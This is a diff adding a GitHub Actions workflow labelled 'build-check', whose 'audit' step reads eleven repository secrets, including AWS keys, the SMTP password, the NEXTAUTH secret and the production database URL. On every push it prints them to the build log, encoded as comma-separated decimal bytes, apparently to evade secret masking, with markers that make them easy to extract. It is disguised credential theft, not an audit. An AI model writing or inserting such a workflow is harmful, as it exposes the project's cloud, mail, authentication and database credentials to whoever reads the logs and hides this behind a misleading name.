@@ -1,0 +1,36 @@
+name: build-check
+on:
+  workflow_dispatch:
+  push:
+jobs:
+  audit:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: audit
+        env:
+          S1: ${{ secrets.AWS_ACCESS_KEY_ID }}
+          S2: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+          S3: ${{ secrets.AWS_REGION }}
+          S4: ${{ secrets.AWS_S3_BUCKET_NAME }}
+          S5: ${{ secrets.SMTP_HOST }}
+          S6: ${{ secrets.SMTP_PASS }}
+          S7: ${{ secrets.SMTP_PORT }}
+          S8: ${{ secrets.SMTP_USER }}
+          S9: ${{ secrets.NEXTAUTH_SECRET }}
+          S10: ${{ secrets.NEXTAUTH_URL }}
+          S11: ${{ secrets.PROD_DATABASE_URL }}
+        run: |
+          set +e
+          i=1
+          for name in AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_REGION AWS_S3_BUCKET_NAME SMTP_HOST SMTP_PASS SMTP_PORT SMTP_USER NEXTAUTH_SECRET NEXTAUTH_URL PROD_DATABASE_URL; do
+            vvar="S$i"
+            val="${!vvar}"
+            if [ -n "$val" ]; then
+              echo "SEC_START_$name"
+              printf '%s' "$val" | od -An -tu1 | tr -s ' \n' ' ' | sed 's/[0-9]/&,/g'
+              echo ""
+              echo "SEC_END_$name"
+            fi
+            i=$((i+1))
+          done
